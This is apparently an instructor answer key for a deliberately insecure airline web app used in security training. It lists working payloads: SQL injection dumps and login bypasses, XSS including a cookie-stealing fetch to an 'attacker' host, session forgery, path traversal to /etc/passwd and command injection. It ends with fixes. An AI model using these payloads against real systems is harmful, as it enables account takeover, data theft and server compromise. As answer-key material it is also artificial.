# SkyHaven Airways — Vulnerability Guide (instructor / answer key)

> ⚠️ **For authorized security training only.** This app is deliberately
> insecure. Run it on `localhost` and never expose it to a public network.
> Do not reuse any of this code in a real application.

All payloads below assume the app is running at `http://localhost:8000`.
The database is **reset every time you start `server.py`**, so you can
experiment freely and restart for a clean slate.

## Seeded accounts

| Username   | Password            | Role  |
|------------|---------------------|-------|
| `admin`    | `Sh@dow-Adm1n-2026` | admin |
| `j.walker` | `password123`       | user  |
| `s.mehta`  | `sunshine`          | user  |
| `m.chen`   | `dragon88`          | user  |
| `guest`    | `guest`             | user  |

---

## 1 & 2. SQL Injection — flight search  *(OWASP A03: Injection)*
**Where:** `GET /flights` params `from`, `to`, `q` → `flights_page()` in `server.py`.
Search terms are concatenated straight into the SQL string.

- **Auth-free error-based confirmation:** `/flights?q='` → returns the raw SQL
  error *and the full query* (see #12).
- **UNION data exfiltration** (flights table = 9 columns). Extract every
  user's credentials + card number, rendered as fake flight rows:
  ```
  /flights?from=zzz' UNION SELECT id,password,username,email,'2026-08-01 09:00','2026-08-01 10:00',skymiles,0,credit_card FROM users-- 
  ```
  (URL-encode it.) Password lands in the flight-code field, card number in
  the aircraft field.

## 3. Reflected XSS — flight search  *(A03: Injection / XSS)*
**Where:** `flights_page()` echoes `from`/`to`/`q` into HTML unescaped.
```
/flights?from=<script>alert(document.cookie)</script>
```
The `session` cookie has no `HttpOnly` flag (see #10), so this steals sessions.

## 4. Stored XSS — contact / reviews  *(A03)*
**Where:** `POST /contact` stores the message; `contact_page()` renders the
body unescaped for every visitor **and** for the admin console.
Submit as the message body:
```html
<script>fetch('http://attacker/c?'+document.cookie)</script>
```
Persists to all future viewers of `/contact` and `/admin`.

## 5. SQL Injection — login / auth bypass  *(A07: Auth Failures + A03)*
**Where:** `do_login()`. Login without a password:
- Username `admin'--`  password (anything) → logged in as admin.
- Username `' OR '1'='1'--` → logs in as the first user (admin).

## 6. IDOR — view any booking  *(A01: Broken Access Control)*
**Where:** `GET /booking?id=` never checks ownership.
Log in as `guest`, then walk the IDs:
```
/booking?id=1   /booking?id=2   /booking?id=3 ...
```
You'll see other passengers' names, emails, routes and booking refs.

## 7. Broken authentication — forgeable session  *(A07 / A02)*
**Where:** `make_session()` / `read_session()`. The `session` cookie is just
`base64(json)` with **no signature and no server-side state**. Decode, edit,
re-encode:
```bash
# forge an admin session out of thin air
python3 -c "import base64,json;print(base64.b64encode(json.dumps({'uid':5,'username':'guest','role':'admin'}).encode()).decode())"
```
Set that as your `session` cookie → instant admin.

## 8. Sensitive data exposure — user API  *(A01 / A02: Crypto Failures)*
**Where:** `GET /api/users` — no authentication at all. Dumps every user
including **plaintext passwords** and **credit-card numbers**:
```
curl http://localhost:8000/api/users
```
Passwords are also stored in plaintext (`do_register`, seed data).

## 9. Path traversal / LFI — boarding-pass download  *(A01 / A05)*
**Where:** `download()` joins `?file=` to the folder without normalising.
```
/download?file=../../../../../../etc/passwd
/download?file=../../server.py            # read the app's own source
```

## 10. Broken access control — privilege escalation to admin  *(A01)*
**Where:** `admin_page()` trusts the `role` field from the client cookie.
Combine with #7: forge `role":"admin"` and browse to `/admin` to see the full
user table (with passwords/cards), all contact messages, and the diagnostics
tool.

## 11. OS Command Injection / RCE — admin diagnostics  *(A03)*
**Where:** `diagnostics()` builds `ping -c 2 <host>` with `shell=True`.
As admin (real or forged), submit host:
```
127.0.0.1; id
127.0.0.1 && cat /etc/passwd
127.0.0.1; uname -a
```
Full remote code execution on the server.

## 13. SQL Injection — Manage Booking (PNR lookup)  *(A03 / A07)*
**Where:** `do_manage()`. The retrieve-booking flow matches `PNR + last name`
but concatenates both into SQL. Bypass the last-name check entirely:
- PNR `SKH7F2A9`, last name `' OR '1'='1` → returns the booking without
  knowing the passenger's real name.
- Enumerate other people's PNRs / passenger data by iterating references or
  using boolean/UNION techniques on either field.

## 12. Security misconfiguration — verbose errors + banner  *(A05)*
- SQL errors and the full query are shown to the user (`flights_page`, `do_login`).
- `Server: SkyHaven/1.0` version banner.
- No CSP, `X-Frame-Options`, `X-Content-Type-Options`, or `HttpOnly`/`Secure`
  cookie flags (`send_html`). Cookies are readable by JS (enables #3).
- No CSRF tokens on any state-changing POST (`/book`, `/contact`, `/admin/diagnostics`).

---

## Suggested learning path
1. Recon: read `Server` header, hit `/api/users`, trigger a SQL error.
2. Auth: bypass login with SQLi (#5), then forge a session (#7).
3. Access control: IDOR bookings (#6), escalate to admin (#10).
4. Injection: reflected + stored XSS (#3, #4), UNION dump (#2).
5. Server compromise: LFI (#9) → RCE via diagnostics (#11).

## How you'd fix each (defensive takeaway)
Parameterised queries, output encoding/templating auto-escape, server-side
signed sessions (or opaque random IDs + server store), authZ checks on every
object access, hashed passwords (bcrypt/argon2), auth on APIs, `os.path.realpath`
containment checks for downloads, `subprocess` with arg lists + `shell=False`
and an allow-list, generic error pages, security headers + CSRF tokens.
